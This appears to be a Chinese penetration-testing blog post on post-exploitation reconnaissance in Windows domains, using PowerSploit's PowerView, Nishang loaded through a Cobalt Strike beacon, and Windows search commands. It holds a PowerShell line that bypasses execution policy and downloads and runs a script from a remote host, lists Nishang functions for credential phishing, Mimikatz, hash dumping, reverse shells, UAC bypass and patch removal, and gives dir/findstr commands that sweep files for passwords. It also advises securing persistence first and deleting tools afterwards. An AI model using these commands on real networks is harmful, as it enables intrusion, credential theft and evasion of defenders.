<h2 id="6-使用powershell收集域内信息"><a href="#6-使用powershell收集域内信息" class="headerlink" title="6.使用powershell收集域内信息"></a>6.使用powershell收集域内信息</h2><h3 id="powersploit"><a href="#powersploit" class="headerlink" title="powersploit"></a>powersploit</h3><p>PowerSploit是GitHub上面的一个安全项目，上面有很多powershell攻击脚本，它们主要被用来渗透中的信息侦察、权限提升、权限维持。 </p>
<p>Powershell的优点: </p>
<p>1.代码运行在内存中可以不去接触磁盘 </p>
<p>2.从另一个系统中下载代码并执行 </p>
<p>3.很多安全产品并不能监测到powershell的活动 </p>
<p>4.cmd.exe通常被阻止运行，但是powershell不会</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">AntivirusBypass：发现杀毒软件的查杀特征。<br>CodeExecution：在目标主机上执行代码。<br>Exfiltration：目标主机上的信息搜集工具。<br>Mayhem：蓝屏等破坏性脚本。<br>Persistence：后面脚本(持久性控制)。<br>Recon：以目标主机为跳板进行内网信息侦察。<br>ScriptModification：在目标主机上创建或修改脚本。<br></code></pre></td></tr></table></figure>

<p>powerview也是一款非常的powershell脚本工具，用于域内信息的收集。他集成在在 PowerSploit-master\Recon目录下。   <strong>PowerView.ps1</strong></p>
<p>使用方式三种方式</p>
<p>1.靶机本地执行</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> powershell.exe -<span class="hljs-built_in">exec</span> bypass -<span class="hljs-built_in">command</span> <span class="hljs-string">&quot;&amp; &#123; import-module C:\Users\Administrator\Desktop\PowerView.ps1;Get-NetUser&#125;&quot;</span></span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231008102536240.png" srcset="/img/loading.gif" lazyload alt="image-20231008102536240"></p>
<p>2.远程执行</p>
<p>python 开启http 服务 python -m http.server 8080</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">shell powershell -exec bypass -c IEX (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.Net.Webclient).DownloadString(<span class="hljs-string">&#x27;http://ip:8080/PowerView.ps1&#x27;</span>);<span class="hljs-keyword">import</span>-module .\PowerView.ps1;<span class="hljs-keyword">Get</span>-NetShare<br></code></pre></td></tr></table></figure>

<p>3.CS自带命令 攻击机执行</p>
<p>在cs的文件夹中存储ps1文件</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">beacon&gt; powershell-import <span class="hljs-regexp">//</span>导入各种powershell脚本<br>beacon&gt; powershell posershell脚本名 <span class="hljs-regexp">//</span>执行脚本<br>beacon&gt; powershell Check-VM <span class="hljs-regexp">//</span>执行命令<br></code></pre></td></tr></table></figure>

<img src="/img/image-20231008103624188.png" srcset="/img/loading.gif" lazyload alt="image-20231008103624188" style="zoom:80%;" />

<p><img src="/img/image-20231008103855355.png" srcset="/img/loading.gif" lazyload alt="image-20231008103855355"></p>
<p><strong>PowerView.ps1 命令：</strong></p>
<table>
<thead>
<tr>
<th>Get-NetDomain</th>
<th>获取当前用户所在的域名称</th>
</tr>
</thead>
<tbody><tr>
<td>Get-NetUser</td>
<td>返回所有用户详细信息</td>
</tr>
<tr>
<td>Get-NetDomainController</td>
<td>获取所有域控制器</td>
</tr>
<tr>
<td>Get-NetComputer</td>
<td>获取所有域内机器详细信息</td>
</tr>
<tr>
<td>Get-NetOU</td>
<td>获取域中OU信息</td>
</tr>
<tr>
<td>Get-NetGroup</td>
<td>获取所有域内组和组成员信息</td>
</tr>
<tr>
<td>Get-NetFileServer</td>
<td>根据SPN获取当前域使用的文件服务器</td>
</tr>
<tr>
<td>Get-NetShare</td>
<td>获取当前域内所有网络共享</td>
</tr>
<tr>
<td>Get-NetSession</td>
<td>获取在指定服务器存在的Session信息</td>
</tr>
<tr>
<td>Get-NetRDPSession</td>
<td>获取在指定服务器存在的远程连接信息</td>
</tr>
<tr>
<td>Get-NetProcess</td>
<td>获取远程主机的进程信息</td>
</tr>
<tr>
<td>Get-UserEvent</td>
<td>获取指定用户日志信息</td>
</tr>
<tr>
<td>Get-ADObject</td>
<td>获取活动目录的对象信息</td>
</tr>
<tr>
<td>Get-NetGPO</td>
<td>获取域所有组策略对象</td>
</tr>
<tr>
<td>Get-DomainPolicy</td>
<td>获取域默认或域控制器策略</td>
</tr>
<tr>
<td>Invoke-UserHunter</td>
<td>搜索网络中域管理员正在使用的主机</td>
</tr>
<tr>
<td>Invoke-ProcessHunter</td>
<td>查找域内所有机器进程用于找到某特定用户</td>
</tr>
<tr>
<td>Invoke-UserEventHunter</td>
<td>根据用户日志获取某域用户登陆过哪些域机器</td>
</tr>
</tbody></table>
<h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p>Nishang是一款针对PowerShell的渗透工具</p>
<p><img src="/img/image-20231008104006635.png" srcset="/img/loading.gif" lazyload alt="image-20231008104006635"></p>
<h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-number">1.</span>放在<span class="hljs-variable">cs</span>目录<br><span class="hljs-variable">powershell</span><span class="hljs-operator">-</span><span class="hljs-variable">import</span> <span class="hljs-variable">nishang</span><span class="hljs-operator">/</span><span class="hljs-variable">nishang</span><span class="hljs-operator">.</span><span class="hljs-variable">psm1</span><br><span class="hljs-variable">powershell</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">Command</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-variable">nishang</span><br><span class="hljs-number">2.</span>上传到靶机<br><span class="hljs-variable">shell</span> <span class="hljs-variable">powershell</span> <span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">nishang</span>\<span class="hljs-variable">nishang</span><span class="hljs-operator">.</span><span class="hljs-variable">psm1</span><span class="hljs-operator">;</span><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">Command</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-variable">nishang</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231008104859869.png" srcset="/img/loading.gif" lazyload alt="image-20231008104859869"></p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Check</span><span class="hljs-operator">-</span><span class="hljs-variable">VM</span> 检测该主机是不是虚拟机<br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">CredentialsPhish</span> 欺骗用户，让用户输入密码<br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">WLAN</span><span class="hljs-operator">-</span><span class="hljs-built_in">Keys</span> <span class="hljs-variable">wifi</span> 信息<br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">Mimikatz</span> 抓密码<br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">PassHashes</span> 获取<span class="hljs-variable">hash</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">PassHints</span> 获取用户的密码提示信息<br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">PowerShellTcp</span> 反弹<span class="hljs-variable">shell</span><br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">PsUACme</span> 绕过<span class="hljs-variable">UAC</span><br><span class="hljs-built_in">Remove</span><span class="hljs-operator">-</span><span class="hljs-built_in">Update</span> 删除补丁<br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-built_in">Information</span> 本机信息<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231008105107650.png" srcset="/img/loading.gif" lazyload alt="image-20231008105107650"></p>
<h2 id="7-定位计算机中的敏感数据"><a href="#7-定位计算机中的敏感数据" class="headerlink" title="7.定位计算机中的敏感数据"></a>7.定位计算机中的敏感数据</h2><p>内网的核心敏感数据，不仅包括数据库、电子邮件，还包括个人数据及组织的业务数据、技术数据等。可以说，价值较高的数据基本都在内网中。</p>
<p>资料、数据、文件的定位流程：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">定位内部人事组织结构<br>在内部人事组织结构中寻找需要监视的人员<br>定位相关人员的机器<br>视相关人员存放文档的位置<br>列出存放文档的服务器的目录<br></code></pre></td></tr></table></figure>

<p>重点核心业务机器</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">高级管理人员 系统管理人员 财务<span class="hljs-regexp">/人事/</span>业务人员的个人计算机<br>产品管理系统服务器<br>办公系统服务器<br>财务应用系统服务器<br>核心产品源码服务器（SVN/GIT服务器）<br>数据库服务器<br>文件服务器，<br>共享服务器<br>电子邮件服务器<br>网站监控系统服务器<br>信息安全监控服务器<br>生产工厂服务器<br></code></pre></td></tr></table></figure>

<p>敏感信息和敏感文件</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crystal">站点源码备份文件，<br>数据库备份文件等等<br>游览器保存的密码和浏览器的cookie<br>其他用户会话，<br><span class="hljs-number">3389</span>和ipc<span class="hljs-variable">$连</span>接记录，<br>回收站中的信息等等<br>Windows的无线密码<br>网络内部的各种账号密码，<br>包含电子邮箱，V**，FTP等等<br></code></pre></td></tr></table></figure>

<p>在内网中,我们一定要知道自己拿下的机器的人员的职位（职位高的人在内网中权限也高，计算机中的敏感信息也多，还有一种就是特殊职位的人员，例如上面说的，一般都有一些与职位相关的敏感信息。）还有就是拿下一台机器后要先维权，权限稳了再收集信息，信息收集一定要全面仔细，信息收 集完了再搞内网。往目标主机中传工具用完就删。翻文件的话，可以使用一些搜索命令来快速寻找。</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">1.指定目录下搜集各类敏感文件<br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.txt&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> C:\<span class="hljs-string">&quot;*.xlsx&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.md&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.sql&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.pdf&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.docx&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.doc&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*conf*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*bak*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*pwd*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*pass*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*login*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*user*&quot;</span><br>2.指定目录下的文件中搜集各种账号密码<br>findstr <span class="hljs-string">/si</span> pass *<span class="hljs-string">.inc</span> *<span class="hljs-string">.config</span> *<span class="hljs-string">.ini</span> *<span class="hljs-string">.txt</span> *<span class="hljs-string">.asp</span> *<span class="hljs-string">.aspx</span> *<span class="hljs-string">.php</span> *<span class="hljs-string">.jsp</span> *<span class="hljs-string">.xml</span> *<span class="hljs-string">.cgi</span> *<span class="hljs-string">.bak</span><br>findstr <span class="hljs-string">/si</span> userpwd *<span class="hljs-string">.inc</span> *<span class="hljs-string">.config</span> *<span class="hljs-string">.ini</span> *<span class="hljs-string">.txt</span> *<span class="hljs-string">.asp</span> *<span class="hljs-string">.aspx</span> *<span class="hljs-string">.php</span> *<span class="hljs-string">.jsp</span> *<span class="hljs-string">.xml</span> *<span class="hljs-string">.cgi</span> *<span class="hljs-string">.bak</span><br>findstr <span class="hljs-string">/si</span> <span class="hljs-keyword">pwd</span> *<span class="hljs-string">.inc</span> *<span class="hljs-string">.config</span> *<span class="hljs-string">.ini</span> *<span class="hljs-string">.txt</span> *<span class="hljs-string">.asp</span> *<span class="hljs-string">.aspx</span> *<span class="hljs-string">.php</span> *<span class="hljs-string">.jsp</span> *<span class="hljs-string">.xml</span> *<span class="hljs-string">.cgi</span> *<span class="hljs-string">.bak</span><br>findstr <span class="hljs-string">/si</span> login *<span class="hljs-string">.inc</span> *<span class="hljs-string">.config</span> *<span class="hljs-string">.ini</span> *<span class="hljs-string">.txt</span> *<span class="hljs-string">.asp</span> *<span class="hljs-string">.aspx</span> *<span class="hljs-string">.php</span> *<span class="hljs-string">.jsp</span> *<span class="hljs-string">.xml</span> *<span class="hljs-string">.cgi</span> *<span class="hljs-string">.bak</span><br>findstr <span class="hljs-string">/si</span> user *<span class="hljs-string">.inc</span> *<span class="hljs-string">.config</span> *<span class="hljs-string">.ini</span> *<span class="hljs-string">.txt</span> *<span class="hljs-string">.asp</span> *<span class="hljs-string">.aspx</span> *<span class="hljs-string">.php</span> *<span class="hljs-string">.jsp</span> *<span class="hljs-string">.xml</span> *<span class="hljs-string">.cgi</span> *<span class="hljs-string">.bak</span><br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F/" class="category-chain-item">后渗透</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>内网信息搜集3-搜集域环境信息</div>
      <div>http://example.com/2023/10/31/内网信息搜集3-搜集域环境信息/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>r1</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年10月31日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/11/03/%E5%86%85%E7%BD%91-Windows%E8%AE%A4%E8%AF%81/" title="内网-Windows认证">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">内网-Windows认证</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/10/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%862-%E5%86%85%E7%BD%91ip-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" title="内网信息搜集2-内网ip+端口扫描">
                        <span class="hidden-mobile">内网信息搜集2-内网ip+端口扫描</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
